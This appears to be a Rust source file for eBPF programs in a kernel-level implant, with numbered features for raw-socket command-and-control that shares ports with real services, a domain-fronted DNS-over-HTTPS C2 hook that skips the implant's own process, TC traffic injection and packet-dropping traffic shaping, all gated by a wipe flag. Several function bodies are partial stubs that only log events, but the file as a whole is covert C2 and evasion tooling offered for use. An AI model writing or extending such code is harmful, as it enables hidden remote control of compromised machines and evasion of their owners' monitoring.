use aya_ebpf::{
    bindings::xdp_action,
    helpers::{bpf_get_current_pid_tgid, bpf_ktime_get_ns},
    macros::{classifier, kprobe, xdp},
    programs::{ProbeContext, TcContext, XdpContext},
};
use common::{
    EventHeader, EVENT_DOH_C2_ESTABLISHED, EVENT_RAW_SOCKET_C2, EVENT_TC_TRAFFIC_INJECTED,
    EVENT_TRAFFIC_SHAPED,
};

use crate::maps::*;

const RAW_C2_MAGIC: u32 = 0xAE615C2;
const ETH_HDR_LEN: usize = 14;
const IP_HDR_LEN: usize = 20;

// ──────────────────────────────────────────────
// FEATURE 81: Raw Socket C2 (Port Coexistence)
// ──────────────────────────────────────────────

#[xdp]
pub fn shadow_raw_c2(ctx: XdpContext) -> u32 {
    match try_raw_c2(&ctx) {
        Ok(action) => action,
        Err(_) => xdp_action::XDP_PASS,
    }
}

fn try_raw_c2(ctx: &XdpContext) -> Result<u32, i64> {
    let data = ctx.data();
    let data_end = ctx.data_end();
    let pkt_len = data_end - data;

    if pkt_len < ETH_HDR_LEN + IP_HDR_LEN + 8 {
        return Ok(xdp_action::XDP_PASS);
    }

    let ip_hdr = data + ETH_HDR_LEN;
    let protocol = unsafe { *((ip_hdr + 9) as *const u8) };

    // TCP = 6
    if protocol != 6 {
        return Ok(xdp_action::XDP_PASS);
    }

    let tcp_hdr = ip_hdr + IP_HDR_LEN;
    let dst_port = unsafe { u16::from_be(*((tcp_hdr + 2) as *const u16)) };

    if unsafe { RAW_C2_PORTS.get(&dst_port) }.is_none() {
        return Ok(xdp_action::XDP_PASS);
    }

    let tcp_data_offset = unsafe { ((*((tcp_hdr + 12) as *const u8)) >> 4) as usize * 4 };
    let payload_start = tcp_hdr + tcp_data_offset;

    if payload_start + 4 > data_end {
        return Ok(xdp_action::XDP_PASS);
    }

    let magic = unsafe { *(payload_start as *const u32) };
    if magic != RAW_C2_MAGIC {
        return Ok(xdp_action::XDP_PASS);
    }

    if let Some(slot) = unsafe { RAW_C2_STATE.get_ptr_mut(0) } {
        unsafe { *slot += 1 };
    }

    let event = EventHeader {
        event_type: EVENT_RAW_SOCKET_C2,
        pid: 0,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: dst_port as u64,
    };
    let _ = EVENTS.output(&event, 0);

    Ok(xdp_action::XDP_PASS)
}

// ──────────────────────────────────────────────
// FEATURE 82: TC-Level Traffic Injection
// ──────────────────────────────────────────────

#[classifier]
pub fn shadow_tc_inject(ctx: TcContext) -> i32 {
    match try_tc_inject(&ctx) {
        Ok(action) => action,
        Err(_) => 0, // TC_ACT_OK
    }
}

fn try_tc_inject(ctx: &TcContext) -> Result<i32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    if let Some(buf) = TC_INJECT_QUEUE.reserve::<[u8; 64]>(0) {
        let event = EventHeader {
            event_type: EVENT_TC_TRAFFIC_INJECTED,
            pid: 0,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: ctx.len() as u64,
        };
        let _ = EVENTS.output(&event, 0);
        buf.discard(0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 83: DNS-over-HTTPS C2 with Domain Fronting
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_doh_c2(ctx: ProbeContext) -> u32 {
    try_doh_c2(&ctx).unwrap_or_default()
}

fn try_doh_c2(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let dst_addr: u32 = unsafe { ctx.arg(0).ok_or(1i64)? };

    if unsafe { DOH_FRONT_DOMAINS.get(&dst_addr) }.is_some() {
        let event = EventHeader {
            event_type: EVENT_DOH_C2_ESTABLISHED,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: dst_addr as u64,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 84: Kernel-Level Traffic Shaping
// ──────────────────────────────────────────────

#[classifier]
pub fn shadow_traffic_shape(ctx: TcContext) -> i32 {
    match try_traffic_shape(&ctx) {
        Ok(action) => action,
        Err(_) => 0, // TC_ACT_OK
    }
}

fn try_traffic_shape(ctx: &TcContext) -> Result<i32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pkt_len = ctx.len() as u32;

    if let Some(profile) = unsafe { TRAFFIC_PROFILE_MAP.get_ptr_mut(0) } {
        let p = unsafe { &mut *profile };
        p.bytes_this_window += pkt_len;

        if p.bytes_this_window > p.max_burst_bytes {
            let event = EventHeader {
                event_type: EVENT_TRAFFIC_SHAPED,
                pid: 0,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: p.bytes_this_window as u64,
            };
            let _ = EVENTS.output(&event, 0);

            return Ok(2); // TC_ACT_SHOT — drop to enforce burst limit
        }
    }

    Ok(0)
}
